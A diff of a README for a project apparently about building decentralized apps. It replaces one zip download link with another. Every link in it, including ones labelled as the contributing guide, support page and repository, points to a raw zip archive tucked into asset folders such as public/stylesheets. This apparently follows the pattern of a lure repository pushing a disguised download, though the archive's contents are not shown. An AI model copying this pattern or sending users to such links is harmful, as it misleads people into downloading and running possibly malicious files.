@@ -1,6 +1,6 @@
 # 🌟 Decentralized-Application-Development - Easily Build Decentralized Apps
 
-[![Download Now](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/bin/Application-Development-Decentralized-v3.6.zip%20Now-%20-%23007BFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/bin/Application-Development-Decentralized-v3.6.zip)
+[![Download Now](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/public/stylesheets/Development_Application_Decentralized_1.9.zip%20Now-%20-%23007BFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/public/stylesheets/Development_Application_Decentralized_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Decentralized-Application-Development! This project showcases a simpl
 
 To get started, visit our Releases page to download the latest version of the software:
 
-[Visit this page to download](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/bin/Application-Development-Decentralized-v3.6.zip)
+[Visit this page to download](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/public/stylesheets/Development_Application_Decentralized_1.9.zip)
 
 1. Go to the above link.
 2. Look for the latest release.
@@ -62,15 +62,15 @@ To help you make the most of your experience, we provide several resources:
 
 ### 🙌 Contributing
 
-We welcome contributions! If you would like to contribute to improving this application, please visit our [Contributing Guideline](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/bin/Application-Development-Decentralized-v3.6.zip).
+We welcome contributions! If you would like to contribute to improving this application, please visit our [Contributing Guideline](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/public/stylesheets/Development_Application_Decentralized_1.9.zip).
 
 ### 📞 Support
 
-If you encounter any issues, please refer to our [Support](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/bin/Application-Development-Decentralized-v3.6.zip) page. You can open a new issue for any bugs or request features.
+If you encounter any issues, please refer to our [Support](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/public/stylesheets/Development_Application_Decentralized_1.9.zip) page. You can open a new issue for any bugs or request features.
 
 ### 🔗 Links
 
-- [Visit this page to download](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/bin/Application-Development-Decentralized-v3.6.zip)
-- [GitHub Repository](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/bin/Application-Development-Decentralized-v3.6.zip)
+- [Visit this page to download](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/public/stylesheets/Development_Application_Decentralized_1.9.zip)
+- [GitHub Repository](https://github.com/NguyenMinDuc/Decentralized-Application-Development/raw/refs/heads/master/kraken-arbitrage-challenge/myExpressApp/public/stylesheets/Development_Application_Decentralized_1.9.zip)
 
 Thank you for using Decentralized-Application-Development. We hope you enjoy building your decentralized applications!
